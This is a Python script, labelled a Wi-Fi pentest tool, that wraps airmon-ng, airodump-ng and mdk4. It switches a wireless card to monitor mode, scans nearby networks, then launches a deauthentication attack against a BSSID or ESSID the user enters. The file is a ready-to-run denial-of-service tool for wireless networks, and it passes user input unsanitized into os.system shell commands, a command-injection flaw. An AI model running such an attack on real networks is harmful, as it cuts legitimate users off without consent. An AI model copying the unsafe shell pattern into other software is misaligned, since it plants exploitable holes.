#!/bin/python3
import os
import subprocess

# - Оформление
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.table import Table

console = Console()


def clear():
    os.system('clear' if os.name != 'nt' else 'cls')


# -- Красивый баннер
def show_banner():
    clear()
    banner_text = '''
    ▄▄▄▄▄                                             ▄▄                           
    ██▀▀▀██                                   ██      ██                           
    ██    ██   ▄████▄    ▄█████▄  ██    ██  ███████   ██▄████▄   ▄████▄    ██▄████ 
    ██    ██  ██▄▄▄▄██   ▀ ▄▄▄██  ██    ██    ██      ██▀   ██  ██▄▄▄▄██   ██▀     
    ██    ██  ██▀▀▀▀▀▀  ▄██▀▀▀██  ██    ██    ██      ██    ██  ██▀▀▀▀▀▀   ██      
    ██▄▄▄██   ▀██▄▄▄▄█  ██▄▄▄███  ██▄▄▄███    ██▄▄▄   ██    ██  ▀██▄▄▄▄█   ██      
    ▀▀▀▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀   ▀▀▀▀ ▀▀     ▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀▀    ▀▀      
    '''
    console.print(
        Panel(banner_text, style="bold red", subtitle="Author: Nimpo714", title="[bold white]Wi-Fi Pentest Tool[/]"))


# -- Вывод сетей без обрезания airodump-ng
def get_airodump_output(mon_interface: str):
    # Задаем размер
    env = os.environ.copy()
    env["COLUMNS"] = "300"
    env["LINES"] = "100"

    # - Airodump-ng
    cmd = ["sudo", "timeout", "9s", "airodump-ng", mon_interface]
    subprocess.run(cmd, capture_output=False, text=True, env=env)


# -- Анимация сканирования
def scan_networks(interface):
    with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
    ) as progress:
        # progress.add_task(description="\nПеревод в режим монитора...", total=None)  # ЗДОХЛО
        os.system(f"sudo airmon-ng start {interface} > /dev/null 2>&1")

        interface = interface.replace('mon', '')  # Чтобы не дублировать в случае перезапуска без возврата в исходное состояние
        mon_iface = f"{interface}mon"
        # progress.add_task(description="\nСканирование эфира (9 сек)...", total=None)  # ОНО ОПЯТЬ ЗДОХЛО >:(

        # - Запускаем airodump-ng для показа сетей
        get_airodump_output(mon_iface)

        return mon_iface


def main():
    show_banner()

    # - Вывод интерфейсов в красивой таблице
    table = Table(title="Доступные интерфейсы", title_style="bold cyan")
    table.add_column("ID", justify="center", style="cyan")
    table.add_column("Interface", style="magenta")

    interfaces = os.popen("iw dev | awk '$1==\"Interface\"{print $2}'").read().split()
    for i, iface in enumerate(interfaces):
        table.add_row(str(i), iface)

    console.print(table)

    choice = Prompt.ask("Выберите интерфейс", choices=interfaces, default=interfaces[0])

    # Запуск сканирования
    # с анимацией
    mon_interface = scan_networks(choice)

    console.print(f"[bold green]✔[/] Режим монитора активен на [bold blue]{mon_interface}[/]")

    # Настройка атаки
    ssid_type = Prompt.ask("Тип цели", choices=["BSSID", "ESSID"], default="BSSID")
    target_mac = Prompt.ask(f"Введите [bold red]{ssid_type}[/]")
    channel = Prompt.ask("Введите канал (Channel)")

    # - Визуализация атаки
    console.print(
        Panel(f"[bold yellow]Запуск атаки на {target_mac}...\nНажмите CTRL+C для остановки[/]", border_style="red"))

    try:
        flag = "-B" if ssid_type == "BSSID" else "-E"
        # Запуск mdk4
        os.system(f"sudo mdk4 {mon_interface} d -c {channel} {flag} {target_mac}")
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Атака остановлена пользователем.[/]")
        if Confirm.ask("Вернуть интерфейс в исходное состояние?"):
            os.system(f"sudo airmon-ng stop {mon_interface} > /dev/null 2>&1")
            console.print("[green]Готово![/]")


if __name__ == "__main__":
    main()
